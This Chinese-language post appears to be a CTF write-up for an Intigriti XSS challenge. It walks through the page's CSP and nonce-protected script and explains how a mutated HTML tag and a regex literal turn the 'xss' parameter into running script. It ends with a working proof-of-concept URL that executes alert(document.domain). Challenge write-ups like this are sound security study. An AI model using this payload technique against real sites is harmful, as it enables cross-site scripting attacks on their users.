---
layout: post
title:  Intigriti 1012 xss writeup
tags: [xss]
---

# 摘要
Intigriti 1012 xss writeup。

# 解题过程
题目地址见引用1.  

通过页面提示，我们可以看到html参数。查看iframe页面源码
```html
  <meta
      http-equiv="Content-Security-Policy"
      content="default-src 'none'; script-src 'unsafe-eval' 'strict-dynamic' 'nonce-cd1e3242b79f65198e12c1aefcab6e9e'; style-src 'nonce-14743d6fe7fd0a08ea8d9f109234d206'"
    />

<script nonce="cd1e3242b79f65198e12c1aefcab6e9e">
      window.addEventListener("DOMContentLoaded", function () {
        e = `)]}'` + new URL(location.href).searchParams.get("xss");
        c = document.getElementById("body").lastElementChild;
        if (c.id === "intigriti") {
          l = c.lastElementChild;
          i = l.innerHTML.trim();
          f = i.substr(i.length - 4);
          e = f + e;
        }
        let s = document.createElement("script");
        s.type = "text/javascript";
        s.appendChild(document.createTextNode(e));
        document.body.appendChild(s);
      });
    </script>
```
我们可以看到设置了csp，并且有nonce。  

关键点在于createElement("script")创建的s。往上看，可以看到xss参数，以及一个判断，console下面会报错。需求是，如何让js不报错。起初的想法是使用注释，但是并不成功。可以看到e=f+e，可以加一个四个字母长度的字符串，由于是取的innerHTML，测试发现后两位为`/>`，由于最后4位是标签，所以使用//注释不可行。考虑使用正则。 

另外一点，由于取的是lastElementChild，所以必须要吃掉后面的tag，否则会取到`span/>`。可以参考引用3中的mutation。这样最后的标签为我们所控。  
回到正则，由于有个`)`，导致正则报错，最终发现tag里面还可以使用`(`，成功执行。

就是说，tag name可以不为ASCII alphanumerics咯？

引用2
> Tags contain a tag name, giving the element's name. HTML elements all have names that only use ASCII alphanumerics. In the HTML syntax, tag names, even those for foreign elements, may be written with any mix of lower- and uppercase letters that, when converted to all-lowercase, matches the element's tag name; tag names are case-insensitive.

引用4
> An ASCII digit is a code point in the range U+0030 (0) to U+0039 (9), inclusive.
> An ASCII upper alpha is a code point in the range U+0041 (A) to U+005A (Z), inclusive.
> An ASCII lower alpha is a code point in the range U+0061 (a) to U+007A (z), inclusive.
> An ASCII alpha is an ASCII upper alpha or ASCII lower alpha.
> An ASCII alphanumeric is an ASCII digit or ASCII alpha.

# poc
```
https://challenge-1021.intigriti.io/challenge/challenge.php?xss=/g;alert(document.domain)&html=%3C/h1%3E%3C/div%3E%3Cdiv%20id=%22intigriti%22%3E%3Cform%3E%3Ca(%3Ecc%3Cstyle%3E
```
## 引用
1. https://challenge-1021.intigriti.io/
2. https://html.spec.whatwg.org/multipage/syntax.html#syntax-tag-name
3. https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/
4. https://infra.spec.whatwg.org/#ascii-alphanumeric
